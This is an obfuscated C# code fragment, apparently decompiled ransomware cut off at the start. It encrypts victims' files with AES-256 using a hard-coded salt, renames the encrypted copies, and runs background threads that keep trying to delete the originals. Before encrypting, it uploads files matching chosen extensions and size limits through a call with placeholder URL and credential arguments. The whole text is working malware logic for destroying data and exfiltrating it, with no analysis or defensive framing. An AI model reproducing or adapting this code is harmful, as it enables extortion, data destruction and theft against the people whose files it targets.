						TZtvpaeBArDn.OZyIhSfVXkqPJk("URL", "USERNAME", "ACCESO", NMptsPwAFgqPsjO);
					}
					catch
					{
					}
				}
			}
			fileStream.Dispose();
		}
		byte[] bytes = gmbpOOqXTPC.luhQvjGvnCGKIw(File.ReadAllBytes(NMptsPwAFgqPsjO), YilcQEgimcQT, new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 });
		File.WriteAllBytes(NMptsPwAFgqPsjO, bytes);
		if (NMptsPwAFgqPsjO != TzWSOhZxKOiFnxTy)
		{
			File.Move(NMptsPwAFgqPsjO, TzWSOhZxKOiFnxTy);
		}
	}

	private static void syAUxlbcKlOS(string tPjQOohLPWT, string MPskgRzDaglBHgj, byte[] RxEpMyvsqJVgFo)
	{
		try
		{
			byte[] salt = new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 };
			string path = MPskgRzDaglBHgj;
			FileStream fileStream = new FileStream(path, FileMode.Create, FileAccess.ReadWrite, FileShare.ReadWrite);
			RijndaelManaged rijndaelManaged = new RijndaelManaged();
			rijndaelManaged.KeySize = 256;
			rijndaelManaged.BlockSize = 128;
			Rfc2898DeriveBytes rfc2898DeriveBytes = new Rfc2898DeriveBytes(RxEpMyvsqJVgFo, salt, 1000);
			rijndaelManaged.Key = rfc2898DeriveBytes.GetBytes(rijndaelManaged.KeySize / 8);
			rijndaelManaged.IV = rfc2898DeriveBytes.GetBytes(rijndaelManaged.BlockSize / 8);
			rijndaelManaged.Padding = PaddingMode.Zeros;
			rijndaelManaged.Mode = CipherMode.CBC;
			CryptoStream cryptoStream = new CryptoStream(fileStream, rijndaelManaged.CreateEncryptor(), CryptoStreamMode.Write);
			try
			{
				if (aLevumGFCTL == "YES")
				{
					MemoryMappedFile memoryMappedFile = MemoryMappedFile.CreateFromFile(tPjQOohLPWT, FileMode.Open);
					MemoryMappedViewStream memoryMappedViewStream = memoryMappedFile.CreateViewStream();
					memoryMappedFile.Dispose();
					int num;
					while ((num = memoryMappedViewStream.ReadByte()) != -1)
					{
						cryptoStream.WriteByte((byte)num);
					}
					memoryMappedViewStream.Dispose();
				}
				else
				{
					FileStream fileStream2 = new FileStream(tPjQOohLPWT, FileMode.Open);
					int num2;
					while ((num2 = fileStream2.ReadByte()) != -1)
					{
						cryptoStream.WriteByte((byte)num2);
					}
					fileStream2.Dispose();
				}
			}
			catch (Exception)
			{
				FileStream fileStream3 = new FileStream(tPjQOohLPWT, FileMode.Open);
				int num3;
				while ((num3 = fileStream3.ReadByte()) != -1)
				{
					cryptoStream.WriteByte((byte)num3);
				}
				fileStream3.Dispose();
			}
			cryptoStream.Dispose();
			fileStream.Dispose();
			try
			{
				if (MPskgRzDaglBHgj.Length > 0)
				{
					if (wfmEWWtWllHAhUQ == "YES")
					{
						FileStream fileStream4 = new FileStream(tPjQOohLPWT, FileMode.Open, FileAccess.Read, FileShare.ReadWrite);
						foreach (string item in cSaUketXdIT)
						{
							if (tPjQOohLPWT.ToLower().EndsWith(item) && LzQEwfyRsi == "YES")
							{
								if (Convert.ToInt32(DYczLekywXO) * 1024 * 1024 > fileStream4.Length)
								{
									try
									{
										TZtvpaeBArDn.OZyIhSfVXkqPJk("URL", "USERNAME", "ACCESO", tPjQOohLPWT);
									}
									catch
									{
									}
								}
							}
							else if (tPjQOohLPWT.ToLower().EndsWith(item) && LzQEwfyRsi == "NO")
							{
								try
								{
									TZtvpaeBArDn.OZyIhSfVXkqPJk("URL", "USERNAME", "ACCESO", tPjQOohLPWT);
								}
								catch
								{
								}
							}
						}
						fileStream4.Dispose();
					}
					Thread thread = new Thread((ThreadStart)delegate
					{
						while (true)
						{
							try
							{
								File.Delete(tPjQOohLPWT);
								break;
							}
							catch
							{
								Thread.Sleep(1500);
							}
						}
					});
					thread.Priority = ThreadPriority.Normal;
					thread.IsBackground = true;
					thread.Start();
					if (MPskgRzDaglBHgj.EndsWith(".part"))
					{
						File.Move(MPskgRzDaglBHgj, MPskgRzDaglBHgj.Replace(".part", ""));
					}
					return;
				}
				Thread thread2 = new Thread((ThreadStart)delegate
				{
					while (true)
					{
						try
						{
							if (File.Exists(MPskgRzDaglBHgj))
							{
								File.Delete(MPskgRzDaglBHgj);
							}
							break;
						}
						catch
						{
							Thread.Sleep(1500);
						}
					}
				});
				thread2.Priority = ThreadPriority.Normal;
				thread2.IsBackground = true;
				thread2.Start();
			}
			catch
			{
			}
		}
		catch (Exception ex2)
		{
			if (nsUlKTEfYADHHkY)
			{
				try
				{
					File.AppendAllText(DQNgDvGHNxeJ, "File: " + tPjQOohLPWT + " - Error while fully writing to file: " + ex2.Message + "\r\n");
					return;
				}
				catch (Exception)
				{
					return;
				}
			}
		}
	}
}
